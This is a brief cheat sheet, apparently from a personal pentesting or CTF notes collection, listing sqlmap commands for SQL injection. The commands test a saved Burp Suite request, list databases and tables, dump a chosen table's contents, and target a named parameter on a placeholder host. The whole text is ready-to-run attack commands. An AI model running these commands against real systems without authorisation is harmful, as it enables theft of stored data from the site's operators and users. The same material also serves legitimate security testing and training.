```
1. Save burp request to file
sqlmap -r request.txt --tables --batch // Check for vulnerabilities, show tables and databeses
sqlmap -D DATABASE -T TABLE --dump --batch // Dump all columns in specified table
```


##### Using [[Burp suite]] POST request
`sqlmap -r request.txt `

##### Custom parameters:
`sqlmap -u http://IP/ -p PARAM --batch`

